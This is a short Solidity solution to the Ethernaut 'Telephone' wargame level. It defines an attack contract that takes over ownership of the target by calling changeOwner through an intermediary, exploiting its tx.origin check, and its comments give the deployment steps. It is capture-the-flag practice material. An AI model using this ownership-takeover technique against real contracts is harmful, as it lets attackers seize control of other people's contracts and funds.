// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone telephoneContract;

    constructor(address _address) public {
        telephoneContract = Telephone(_address);
    }

    function hackContract(address _address) public {
        telephoneContract.changeOwner(_address);
    }
}

//
// we need to:
// 1. get smart contract address from task (Ethernaut) page ( contract.address )
// 2. switch environment to 'Injected provider - Metamask'
// 3. deploy TelephoneAttack.sol with address from (1) as a parameter
// 4. call hackContract() method with your ethereum address
//
